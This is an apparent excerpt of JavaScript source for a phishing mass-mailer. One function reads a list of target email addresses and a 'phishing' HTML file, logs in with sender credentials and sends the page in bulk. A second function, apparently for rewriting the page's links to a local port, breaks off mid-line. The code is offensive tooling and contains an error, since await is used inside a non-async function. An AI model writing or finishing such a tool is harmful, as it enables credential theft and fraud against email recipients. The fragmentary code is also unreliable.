...
export async function sendEmailHandler(options) {
  try {
    ...
    const content_email = fs.readFileSync(options.archive, "utf-8");
    const list_emails = stringToArray(content_email);

    fs.accessSync(options.phishing);
    const content_html = fs.readFileSync(options.phishing);

    const [email, pass] = options.login;
    login(email, pass);

    toTransporter(list_emails, content_html, email, pass);
  } catch (e) {
    console.error(`\n\n${pc.bgRed(" ERROR ")}\ ${e}`);
  }
}
...
function modifyLinkEmail(html, PORT){
    var html = await fs.readFile(html, "utf-8");
    const link = 
